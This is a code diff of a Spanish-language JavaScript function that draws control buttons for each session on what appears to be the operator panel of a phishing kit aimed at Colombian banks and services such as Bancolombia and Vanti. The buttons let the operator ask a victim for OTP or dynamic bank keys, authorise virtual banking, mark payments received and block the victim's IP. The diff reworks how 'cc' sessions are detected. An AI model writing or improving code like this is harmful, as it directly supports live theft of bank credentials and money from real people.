@@ -601,12 +601,24 @@ function botonesSesion(s) {
     const ip = escapeHtml(s.datos.ip || '');
     const btns = [];
 
-  if (bancoKey === 'vanti') {
-    btns.push(`<button class="btn" style="background:#6366f1; color:white;" title="Asignar Precio" onclick="ponerPrecio('${sid}')">💲</button>`);
-    btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
-    btns.push(`<button class="btn btn-final" title="Ya Pagó" onclick="accion('${sid}','YA_PAGO')">✅</button>`);
-    return btns.join('');
-}
+    // 🔥 DETECCIÓN INTELIGENTE DE CC: Si el ID incluye 'cc' o el bancoKey es cc-bogota/bucaramanga
+    const esCC = bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga' || s.sessionId.toLowerCase().includes('cc');
+
+    if (esCC) {
+        btns.push(`<button class="btn btn-otp" title="Pedir OTP o Clave Dinámica" onclick="accion('${sid}','OTP')">📱</button>`);
+        btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
+        btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Error CC" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
+        btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Autorizar Banca Virtual" onclick="accion('${sid}','AUTORIZAR')">🔐</button>`);
+        btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
+        return btns.join('');
+    }
+
+    if (bancoKey === 'vanti') {
+        btns.push(`<button class="btn" style="background:#6366f1; color:white;" title="Asignar Precio" onclick="ponerPrecio('${sid}')">💲</button>`);
+        btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
+        btns.push(`<button class="btn btn-final" title="Ya Pagó" onclick="accion('${sid}','YA_PAGO')">✅</button>`);
+        return btns.join('');
+    }
 
     if (bancoKey === 'bancolombia') {
         btns.push(`<button class="btn btn-accept" title="Aceptar" onclick="accion('${sid}','ACEPTAR')">✅</button>`);
@@ -616,15 +628,6 @@ function botonesSesion(s) {
         btns.push(`<button class="btn btn-otp" title="Pedir Clave Dinámica" onclick="accion('${sid}','PEDIR_DINAMICA')">🔢</button>`);
         btns.push(`<button class="btn btn-final" title="Finalizar (Ir a Bancolombia)" onclick="accion('${sid}','FINALIZAR')">🏁</button>`);
         btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Ver Información del Usuario" onclick="verInfoUsuario('${sid}')">👁️</button>`);
-        btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
-        return btns.join('');
-    }
-
-    if (bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga') {
-        btns.push(`<button class="btn btn-otp" title="Pedir OTP o Clave Dinámica" onclick="accion('${sid}','OTP')">📱</button>`);
-        btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
-        btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Error CC" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
-        btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Autorizar Banca Virtual" onclick="accion('${sid}','AUTORIZAR')">🔐</button>`);
         btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
         return btns.join('');
     }
